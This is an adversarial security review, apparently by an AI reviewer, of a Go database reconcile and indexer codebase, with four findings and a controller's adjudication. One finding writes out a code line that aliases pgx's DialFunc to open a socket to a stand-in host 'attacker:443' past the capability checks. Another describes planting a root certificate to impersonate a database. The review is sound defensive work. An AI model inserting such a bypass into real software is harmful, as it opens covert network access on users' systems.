# Codex adversarial review — task 9 wave 19 (round 19, reconcile closing attempt two)

- **Target:** detached `0d16b0c` (== origin/main tip, stated; interval `2d59ee3..0d16b0c`
  verified empty for the restricted paths), range `69aedd0..2d59ee3` restricted to
  `cmd/reconcile/**`, `internal/store/**`, `cmd/indexer/**`.
- **Verdict:** **NO-SHIP** — 2 high, 1 medium, 1 low.
- **Job:** `review-ms3hk1sj-m2byvg`; session `019fa491-3331-7ac2-8a69-95af0e2d0077`;
  worktree `C:/wt19r` pruned; broker PID 36268 verified by `--cwd` and killed.
- **Confirmed sound:** the reviewer DSN (`postgres://solvent@db/claimed?dbname=`)
  correctly computes an empty effective database and is rejected; F2 intact; all 17
  PG* names intact; the mutation re-run SHA binding intact.

## Findings (verbatim)

### [high] Generation binding does not invalidate cadence from a previous daemon instance — `cmd/indexer/main.go:841-849`
A failed cadence write is tolerated without invalidating an existing value. Because daemon restart does not inherently change current_generation, a row stamped by the previous process remains readable when its generation still equals current_generation. Concrete scenario: an open generation carries interval=2h and stamp=7; the daemon restarts configured for 30m, but its startup and per-round UPDATEs fail. Reconcile still receives 2h as verified. With last_pass=10m it permits 260m while the running daemon permits 80m, so a 100-minute-old sample can pass. conditionCadenceUnpersisted makes health red but is not consumed by reconcile.
**Recommendation:** Bind cadence to a durable daemon-start epoch, or make the pre-loop overwrite mandatory and fatal before the new daemon can run. Add a regression with a stale cadence stamped to the same current_generation and a failed overwrite.

### [high] APPDATA predicate misses relative Windows trust paths and falsely fires off Windows — `cmd/reconcile/env.go:289-296`
The judge returns clean whenever APPDATA is empty and never checks the target OS. On Windows, pgx still constructs filepath.Join("", "postgresql", "root.crt"), which is relative to the process working directory. With user.Current succeeding, verify-full, and an unpinned DSN, a planted postgresql/root.crt can therefore authorize an impersonating database while reconcile records no taint. Conversely, non-Windows pgx builds never read APPDATA, yet any unrelated nonempty APPDATA value falsely taints them.
**Recommendation:** Use platform-specific implementations: non-Windows must ignore APPDATA, while Windows must treat unpinned TLS defaults as unverified even when APPDATA is empty, unless the resulting relative trust path is explicitly eliminated. Add tests for both cases.

### [medium] Aliasing pgx ConnConfig.DialFunc bypasses capability closure — `cmd/reconcile/snapshotdb/boundary_test.go:614-635`
The scan rejects a function-typed field only when invoked directly, but permits calls through local function variables and the formation ban covers only package-level functions. Code inserted after gate.Enter such as `dial := conn.Config().DialFunc; side, _ := dial(ctx, "tcp", "attacker:443")` uses no new import and survives all stated checks. It opens an arbitrary socket while the repeatable-read transaction remains active.
**Recommendation:** Ban formation of function-typed fields, or track local function-value provenance and allow only explicitly justified values such as context cancellation functions. Add this DialFunc-alias shape as a mutation.

### [low] The claimed-versus-connected regression does not cover execute wiring — `cmd/reconcile/pgxdsn_test.go:129-150`
The test invokes claimVsConnectedTaint and computeResult directly. Deleting the execute call that appends this taint recreates the predecessor draft's exact unwired state while this test and mutant W19M2 still pass. The production wiring currently exists, but the claimed regression does not protect it.
**Recommendation:** Add an execute-level injection seam or a structural call-site assertion, then add a mutation that removes the execute wiring rather than only making the judge inert.

## Controller adjudication

**All four ACCEPTED.** The two highs are the wave-19 mechanisms pushed one level
deeper, the same shape as every productive round:

1. **[H1] instance-binding:** generation-binding is not instance-binding when restart
   does not roll the generation. Brief offers both recommended mechanisms
   (pick-and-justify): (a) durable daemon-start epoch in the stamp, or (b) the
   pre-loop overwrite becomes MANDATORY AND FATAL (the daemon already cannot run
   without the DB — no new availability dependency; per-round failures may then stay
   tolerated+surfaced because startup guarantees the value belongs to THIS instance).
   The regression is Codex's exact scenario.
2. **[H2] APPDATA platform truth:** the predicate must match pgx's per-platform
   behavior exactly — non-Windows ignores APPDATA entirely; Windows treats unpinned
   TLS defaults as unverified EVEN WHEN APPDATA IS EMPTY (the relative-path case).
   Tests both directions.
3. **[M3] DialFunc alias:** function-value provenance/formation ban — the third
   capability-evasion generation (import → first-party call → field-alias). Mutant
   per the exact shape.
4. **[L4] execute-wiring regression:** the omission mutant — the regression must
   protect the WIRING, not the judge. (The predecessor's bug class, now as a test-gap.)

Fix wave: `task-9-wave20-brief.md`. Trend note, honestly: 3H2M → 2H1M → 1H1M → 1H3M →
0H4M → **2H1M1L** — reconcile has NOT converged the way ingest did; each wave's new
mechanism opens new surface. The findings remain refinements (no new classes, and the
round-16 confirmations all held), but the closing round is not yet in sight-distance.
